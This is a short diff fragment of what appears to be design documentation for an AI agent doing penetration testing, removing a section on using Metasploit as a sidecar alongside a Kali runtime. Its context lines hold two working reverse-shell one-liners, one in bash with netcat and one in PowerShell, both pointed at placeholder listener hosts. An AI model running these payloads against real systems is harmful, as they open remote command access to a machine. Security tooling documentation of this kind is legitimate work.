@@ -118,14 +118,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LISTENER_HOST LISTENER_P
 powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LISTENER_HOST',LISTENER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"
 ```
 
-## Integration with Existing Systems
-
-### Metasploit (optional sidecar)
-MSF remains available for exploit modules (gadget generation, specific CVE exploits).
-For shell handling (catching reverse shells, session management), use pwncat-vl instead.
-MSF's memory footprint (~1.5GB+) makes it impractical as a persistent shell handler
-when running alongside the primary Kali runtime.
-
 ## Agent Rules
 
 Agents **MUST NOT:**
